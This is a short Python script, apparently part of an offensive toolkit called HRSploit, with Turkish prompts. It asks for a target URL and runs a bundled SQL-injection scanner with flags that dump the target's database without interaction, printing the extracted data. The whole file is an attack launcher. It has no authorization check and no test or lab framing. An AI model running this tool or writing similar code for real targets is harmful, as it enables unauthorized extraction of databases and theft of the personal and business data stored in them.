#!/usr/bin/env python3
"""HRSploit Database Dump Engine."""
import sys
from pathlib import Path
BASE = Path(__file__).parent
sys.path.insert(0, str(BASE.parent))

def run(target=None, db_type="MySQL"):
    from datetime import datetime
    print(f"[DB-DUMP] Baslaniyor: {target}")
    try:
        import sys as _sys; _sys.path.insert(0, str(BASE.parent))
        from All_SQL.sqli_scanner import scan as sqli_scan
    except ImportError:
        pass
    parent_sqli = BASE.parent / "All-SQL" / "sqli_scanner.py"
    if parent_sqli.exists():
        import subprocess
        proc = subprocess.Popen(
            [_sys.executable, str(parent_sqli), "-u", target or "", "--dump", "--dbms", db_type, "--batch"],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        for line in proc.stdout:
            if line.strip(): print(f"  [DUMP] {line.strip()}")
        proc.wait(timeout=180)
    return {"status":"completed","db":db_type}

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else input("Hedef URL: ").strip()
    run(target)
